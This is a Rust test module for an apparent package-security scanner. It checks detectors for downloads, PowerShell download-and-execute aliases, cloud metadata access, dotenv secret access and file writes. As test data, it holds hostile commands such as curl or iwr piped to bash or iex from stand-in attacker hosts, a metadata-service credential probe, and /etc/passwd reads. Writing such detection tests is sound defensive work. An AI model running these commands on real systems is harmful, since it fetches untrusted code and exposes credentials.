                capability_present(&caps, ArtifactCapability::NetworkAccess),
                "download command must raise NetworkAccess for {content:?}; got {caps:?}",
            );
            let links = script_relations(content);
            assert!(
                relation_target_present(&links, "remote-resource"),
                "download command must raise Downloads edge for {content:?}; got {links:?}",
            );
        }
    }

    /// # Contract (negative)
    ///
    /// Downloader matching is command-token aware. Lookalike command names
    /// must not create Downloads edges.
    #[test]
    fn script_download_command_matching_rejects_substrings() {
        for content in [
            "mycurl\thttps://attacker.example/tool.sh\n",
            "awget\thttps://attacker.example/tool.sh\n",
            "exec('mycurl\t$PAYLOAD_URL')\n",
            "kiwr\t$PAYLOAD_URL | iex\n",
            "kiwr($PAYLOAD_URL) | iex\n",
            "confirm($PAYLOAD_URL) | iex\n",
        ] {
            let links = script_relations(content);
            assert!(
                !relation_target_present(&links, "remote-resource"),
                "lookalike command must not raise Downloads edge for {content:?}; got {links:?}",
            );
        }
    }

    /// # Contract
    ///
    /// Filesystem command matching accepts tabs between command names and
    /// their arguments.
    #[test]
    fn filesystem_command_matching_accepts_tabs() {
        let write_caps = script_capabilities("tee\t/etc/profile\n");
        assert!(capability_present(
            &write_caps,
            ArtifactCapability::FilesystemWrite
        ));
        let write_links = script_relations("tee\t/etc/profile\n");
        assert!(write_links
            .iter()
            .any(|link| matches!(link.relation, ArtifactRelation::Writes)));

        for content in ["cat\t/etc/passwd\n", "rg\tSECRET ./src\n"] {
            let links = script_relations(content);
            assert!(
                links
                    .iter()
                    .any(|link| matches!(link.relation, ArtifactRelation::Reads)),
                "{content:?} must produce a filesystem Reads edge; got {links:?}"
            );
        }
    }

    /// # Contract (negative)
    ///
    /// Filesystem command matching rejects lookalike command names.
    #[test]
    fn filesystem_command_matching_rejects_substrings() {
        let write_caps = script_capabilities("guarantee\t/etc/profile\n");
        assert!(!capability_present(
            &write_caps,
            ArtifactCapability::FilesystemWrite
        ));
        let links = script_relations("bobcat\t/etc/passwd\n");
        assert!(!links
            .iter()
            .any(|link| matches!(link.relation, ArtifactRelation::Reads)));
    }

    /// Contract: an inline `#` comment in a shell script MUST be
    /// stripped before pattern matching. Pre-fix `analyze_script` fed
    /// raw `content` to every detector, so a benign documentation
    /// line like `echo done  # was: curl https://old/install.sh` fired
    /// `SCRIPT_REMOTE_BINARY_DOWNLOAD` even though `curl` was never
    /// executed. Mirrors the comment-aware contract of the Makefile
    /// and Dockerfile orchestrators.
    #[test]
    fn analyze_script_skips_remote_download_inside_shell_comment() {
        let path = std::path::Path::new("/pkg/install.sh");
        let content = "echo done  # was: curl https://old/install.sh\n";
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_script(&service, path, content);
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == "SCRIPT_REMOTE_BINARY_DOWNLOAD"),
            "documentation comment must not fire SCRIPT_REMOTE_BINARY_DOWNLOAD; got {findings:?}",
        );
    }

    /// Contract: same comment-stripping applies to Python scripts.
    /// `# requests.get(...)` in a Python file is documentation, not
    /// runtime behavior.
    #[test]
    fn analyze_script_skips_remote_download_inside_python_comment() {
        let path = std::path::Path::new("/pkg/setup.py");
        let content = "x = 1  # was using curl https://old/install.sh\n";
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_script(&service, path, content);
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == "SCRIPT_REMOTE_BINARY_DOWNLOAD"),
            "Python comment must not fire SCRIPT_REMOTE_BINARY_DOWNLOAD; got {findings:?}",
        );
    }

    /// Contract: a real `curl ... | bash` outside any comment MUST
    /// still fire. Negative-case regression so the comment fix
    /// doesn't accidentally widen and silence legitimate detections.
    #[test]
    fn analyze_script_still_detects_uncommented_remote_download() {
        let path = std::path::Path::new("/pkg/install.sh");
        let content = "curl https://attacker.example/install.sh | bash\n";
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_script(&service, path, content);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "SCRIPT_REMOTE_BINARY_DOWNLOAD"),
            "uncommented curl pipe-to-bash MUST still fire; got {findings:?}",
        );
    }

    /// Contract: PowerShell download aliases that retrieve executable
    /// payloads are artifact findings, not only graph-level network edges.
    #[test]
    fn analyze_script_detects_powershell_remote_download_aliases() {
        let path = std::path::Path::new("/pkg/bootstrap.ps1");
        let service = ArtifactOrchestratorService::new();

        for content in [
            "iwr https://attacker.example/payload.ps1 | iex\n",
            "irm(https://attacker.example/payload.ps1) | iex\n",
            "Invoke-RestMethod https://attacker.example/payload.ps1 | iex\n",
        ] {
            let findings = analyze_script(&service, path, content);
            assert!(
                findings
                    .iter()
                    .any(|f| f.rule_id == "SCRIPT_POWERSHELL_REMOTE_DOWNLOAD"),
                "PowerShell download alias must fire SCRIPT_POWERSHELL_REMOTE_DOWNLOAD for {content:?}; got {findings:?}",
            );
        }
    }

    /// Contract (negative): alias lookalikes do not produce PowerShell
    /// remote-download findings just because they contain `iwr` or `irm`.
    #[test]
    fn analyze_script_rejects_powershell_remote_download_alias_substrings() {
        let path = std::path::Path::new("/pkg/bootstrap.ps1");
        let service = ArtifactOrchestratorService::new();

        for content in [
            "kiwr https://attacker.example/payload.ps1 | iex\n",
            "confirm(https://attacker.example/payload.ps1) | iex\n",
        ] {
            let findings = analyze_script(&service, path, content);
            assert!(
                !findings
                    .iter()
                    .any(|f| f.rule_id == "SCRIPT_POWERSHELL_REMOTE_DOWNLOAD"),
                "lookalike alias must not fire SCRIPT_POWERSHELL_REMOTE_DOWNLOAD for {content:?}; got {findings:?}",
            );
        }
    }

    /// Contract: a `# was: curl 169.254.169.254/latest/meta-data` comment
    /// in a shell script MUST NOT fire `METADATA_SERVICE_ACCESS` (or any
    /// internal-network rule) coming out of `permission_and_network_findings`.
    /// Pre-fix `analyze_script` passed RAW `content` to that detector even
    /// though it had already comment-stripped the input for every other
    /// detector above; the asymmetry re-introduced the FP class for the
    /// permission/network path alone. This test pins both detectors on the
    /// same comment input so the pipeline stays internally consistent.
    #[test]
    fn analyze_script_skips_internal_network_inside_shell_comment() {
        let path = std::path::Path::new("/pkg/install.sh");
        let content = "echo done  # was: curl 169.254.169.254/latest/meta-data\n";
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_script(&service, path, content);
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == "METADATA_SERVICE_ACCESS"),
            "comment must not fire METADATA_SERVICE_ACCESS; got {findings:?}",
        );
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == "INTERNAL_NETWORK_ACCESS"),
            "comment must not fire INTERNAL_NETWORK_ACCESS; got {findings:?}",
        );
    }

    /// Contract: an uncommented `curl 169.254.169.254/...` MUST still fire
    /// the metadata-service rule. Negative-side regression so the
    /// comment-stripping alignment doesn't accidentally widen and silence
    /// real internal-network detections.
    #[test]
    fn analyze_script_still_detects_uncommented_metadata_target() {
        let path = std::path::Path::new("/pkg/install.sh");
        let content = "curl http://169.254.169.254/latest/meta-data/iam/\n";
        let service = ArtifactOrchestratorService::new();
        let findings = analyze_script(&service, path, content);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "METADATA_SERVICE_ACCESS"),
            "uncommented metadata-service hit MUST still fire; got {findings:?}",
        );
    }

    /// Contract: comment-stripping preserves line count so any future
    /// line-tracked finding stays at the right line. Pin the helper
    /// directly so a refactor can't silently switch to `\n`-joining
    /// (which loses the trailing newline) or skip empty lines.
    #[test]
    fn strip_comments_for_detection_preserves_line_count() {
        let content = "alpha\n# pure comment line\nbeta # inline\n";
        let stripped = strip_comments_for_detection(content, "sh");
        assert_eq!(
            stripped.lines().count(),
            content.lines().count(),
            "line count MUST be preserved; got {stripped:?}",
        );
        assert_eq!(stripped.ends_with('\n'), content.ends_with('\n'));
    }

    /// Contract: languages without `#` comments (`js`, `ts`) are left
    /// untouched. Stripping `//` would collide with `https://` and
    /// produce false negatives, so the orchestrator deliberately
    /// limits the strip to hash-comment languages.
    #[test]
    fn strip_comments_for_detection_leaves_javascript_untouched() {
        let js = "const x = 'ok'; // comment\n";
        let stripped = strip_comments_for_detection(js, "js");
        assert_eq!(stripped, js, "`.js` content must round-trip unchanged");
    }

    /// Contract: a `#` URL fragment in a shell command is NOT treated as a
    /// comment, so a download-execute line with a fragment survives
    /// stripping and reaches the detectors. Pre-fix the fragment split the
    /// line and dropped the `| sh` sink, evading detection.
    #[test]
    fn strip_comments_for_detection_keeps_shell_url_fragment() {
        let content = "curl https://evil.example/x#frag | sh\n";
        let stripped = strip_comments_for_detection(content, "sh");
        assert!(
            stripped.contains("| sh"),
            "the pipe-to-shell sink must survive stripping; got {stripped:?}",
        );
        assert!(stripped.contains("#frag"), "URL fragment must be preserved");
    }

    /// Contract: `references_dotenv_file` MUST NOT classify benign
    /// content that incidentally contains the four bytes `.env` as a
    /// dotenv-file reference. Pre-fix `lower.contains(".env")` fired on
    /// `.envrc` (direnv config), `.envelope`, `.environment/...`,
    /// `.envconfig`, and identifiers like `MY_DOTENV_VAR=` —
    /// over-emitting `SecretAccess` capability and `AccessesSecrets`
    /// relation, which combined with `NetworkAccess` could trigger a
    /// false `ARTIFACT_TAINT_SECRET_TO_EXTERNAL_NETWORK` finding on
    /// completely benign code.
    #[test]
    fn references_dotenv_file_rejects_lookalike_filenames() {
        let benign = [
            "echo .envrc",
            "load .envelope",
            "open(\".environment/default.cfg\")",
            "read .envconfig",
            "MY_ENV=production",
            "subscriber.envoy(message)",
            "config = parse(.environments)",
        ];
        for sample in benign {
            assert!(
                !references_dotenv_file(&sample.to_ascii_lowercase()),
                "must NOT classify lookalike as dotenv reference: {sample:?}"
            );
        }
    }

    /// Contract: `references_dotenv_file` MUST fire on a genuine dotenv
    /// reference. Pin the canonical forms (library names, quoted
    /// filename, shell-form path) so a future tightening doesn't
    /// silently lose the positive signal.
    #[test]
    fn references_dotenv_file_fires_on_genuine_dotenv_references() {
        let positive = [
            "require('dotenv').config()",
            "load_dotenv()",
            "import dotenv",
            "open(\".env\")",
            "open('.env')",
            "open(\"/etc/.env\")",
            "cat .env",
            "read .env",
            "fs.readFile(\"./.env\")",
            "with open('.env') as f:",
        ];
        for sample in positive {
            assert!(
                references_dotenv_file(&sample.to_ascii_lowercase()),
                "must classify genuine dotenv reference: {sample:?}"
            );
        }
    }

    /// End-to-end contract: `script_capabilities` MUST NOT emit
    /// `SecretAccess` on a script whose content references only `.envrc`
    /// or other non-dotenv `.env*` filenames. Pre-fix this misclassified
    /// direnv users; the false `SecretAccess` then propagated to the
    /// taint engine if the script also did any network access.
    #[test]
    fn script_capabilities_does_not_emit_secret_access_for_envrc_lookalikes() {
        let content =
            "echo \"setting up direnv\"\nsource .envrc\nfetch https://example.invalid/x\n";
        let caps = script_capabilities(content);
        assert!(
            !capability_present(&caps, ArtifactCapability::SecretAccess),
            "direnv .envrc reference must NOT raise SecretAccess; got {caps:?}"
        );
    }

    /// End-to-end contract: `script_relations` MUST NOT emit an
    /// `AccessesSecrets` relation on a script that only mentions
    /// `.envelope` (or other non-dotenv `.env*` lookalikes). Pre-fix
    /// the bare substring fired here too, inflating the artifact graph.
    #[test]
    fn script_relations_does_not_emit_secrets_for_envelope_lookalikes() {
        let content = "open_envelope = lambda f: parse(f)\nread .envelope\n";
        let links = script_relations(content);
        assert!(
            !relation_target_present(&links, "secrets"),
            ".envelope reference must NOT raise AccessesSecrets; got {links:?}"
        );
    }

    /// End-to-end positive: a script that calls `load_dotenv()` MUST
    /// still raise `SecretAccess` and `AccessesSecrets`. Pin the
    /// happy path so the dotenv tightening doesn't silently lose
    /// genuine secret-access signal.
    #[test]
    fn script_capabilities_still_raises_secret_access_for_load_dotenv() {
        let content = "from dotenv import load_dotenv\nload_dotenv()\n";
        let caps = script_capabilities(content);
        assert!(capability_present(&caps, ArtifactCapability::SecretAccess));

        let links = script_relations(content);
        assert!(relation_target_present(&links, "secrets"));
    }

    /// # Contract (negative)
    ///
    /// Bitshift right (`>>`) in Python / Rust / JavaScript / C-family code
    /// MUST NOT raise `FilesystemWrite`. Pre-fix `lower.contains(">>")`
    /// fired on `flags >> 3`, `value >> 8`, `logits >> 2`, etc., inflating
    /// the artifact graph with spurious `Writes → filesystem` edges. When
    /// the same script also accessed secrets, those spurious edges
    /// produced false `SecretExfiltration` taint chains that escalated
    /// Benign packages toward Malicious.
    #[test]
    fn script_capabilities_does_not_fire_filesystem_write_on_bitshift() {
        for sample in [
            "shift = flags >> 3\n",
            "let x = value >> 8;\n",
            "result = num >> 2",
            "logits >> 2",
            "x>>shift", // tight C-style without spaces — also bitshift
        ] {
            let caps = script_capabilities(sample);
            assert!(
                !capability_present(&caps, ArtifactCapability::FilesystemWrite),
                "must NOT raise FilesystemWrite on bitshift: {sample:?} -> {caps:?}"
            );
            let links = script_relations(sample);
            assert!(
                !relation_target_present(&links, "filesystem"),
                "must NOT raise filesystem Writes edge on bitshift: {sample:?} -> {links:?}"
            );
        }
    }

    /// # Contract (positive)
    ///
    /// Genuine shell append-redirects MUST still raise `FilesystemWrite`.
    /// Pins the desired behavior so a future tightening of
    /// `contains_shell_append_redirect` cannot silently kill the legitimate
    /// signal — the original purpose of the `>>` token in this layer.
    #[test]
    fn script_capabilities_fires_filesystem_write_on_shell_append() {
        for sample in [
            "echo done >> /tmp/log.txt\n",
            "cat /etc/passwd >> dump.log\n",
            "echo $payload >> ~/.bashrc",
            "echo done >> \"$HOME/.zshrc\"\n",
            "echo data >>'/tmp/out'",
        ] {
            let caps = script_capabilities(sample);
            assert!(
                capability_present(&caps, ArtifactCapability::FilesystemWrite),
                "must raise FilesystemWrite on shell append: {sample:?} -> {caps:?}"
            );
            let links = script_relations(sample);
            assert!(
                relation_target_present(&links, "filesystem"),
                "must raise filesystem Writes edge on shell append: {sample:?} -> {links:?}"
            );
        }
    }
}
